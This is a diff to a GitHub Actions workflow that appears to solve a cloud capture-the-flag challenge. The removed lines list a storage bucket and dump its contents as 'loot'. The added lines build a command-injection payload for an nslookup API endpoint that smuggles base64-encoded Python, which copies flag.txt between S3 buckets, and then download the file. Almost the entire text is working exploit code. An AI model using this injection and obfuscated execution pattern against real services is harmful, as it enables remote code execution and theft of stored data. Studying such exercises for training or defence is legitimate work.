@@ -21,21 +21,31 @@ jobs:
 
       - name: Invoke Vulnerable Lambda
         run: |
-          BUCKET="codec4f26c862a321ef5"
+          API_ID="3q931syi7b"
+          REGION="us-east-1"
+          URL="https://${API_ID}.execute-api.${REGION}.amazonaws.com/dev/nslookup"
           
-          echo "=== 1. RECURSIVELY LISTING ALL FILES IN THE BUCKET ==="
-          aws s3 ls "s3://$BUCKET" --recursive
+          # Create a bulletproof python snippet using boto3 to copy the file server-side
+          PY_CODE="import boto3\ns3 = boto3.client('s3')\ns3.copy_object(Bucket='site781fe43f26b9eba3', CopySource={'Bucket': 'codec4f26c862a321ef5', 'Key': 'flag.txt'}, Key='flag.txt')"
+          
+          # Base64 encode it so shell quoting never breaks
+          ENCODED_SCRIPT=$(echo -e "$PY_CODE" | base64 -w 0)
+          
+          PAYLOAD="{\"domain\": \"127.0.0.1; echo '${ENCODED_SCRIPT}' | base64 -d | python3\"}"
+          
+          echo "=== 1. TRIGGERING BACKEND S3 COPY ==="
+          curl -s -X POST "$URL" \
+            -H "Content-Type: application/json" \
+            -d "$PAYLOAD"
           
           echo ""
-          echo "=== 2. DOWNLOADING EVERYTHING LOCALLY ==="
-          mkdir -p s3_loot
-          aws s3 sync "s3://$BUCKET" ./s3_loot/
+          echo "=== 2. WAITING 3 SECONDS FOR S3 PROPAGATION ==="
+          sleep 3
+          
+          echo "=== 3. DOWNLOADING FLAG FROM OPEN COMPANION BUCKET ==="
+          # Download directly from site781fe43f26b9eba3 where cicdRole has full permission!
+          aws s3 cp "s3://site781fe43f26b9eba3/flag.txt" ./the_real_flag.txt
           
           echo ""
-          echo "=== 3. PRINTING CONTENTS OF ALL DOWNLOADED FILES ==="
-          # This will automatically find every file in the loot folder and print its contents to the log
-          find ./s3_loot -type f -exec echo "====================" \; \
-                         -exec echo "FILE: {}" \; \
-                         -exec echo "====================" \; \
-                         -exec cat {} \; \
-                         -exec echo "" \;
+          echo "=== 4. BEHOLD YOUR VICTORY ==="
+          cat ./the_real_flag.txt
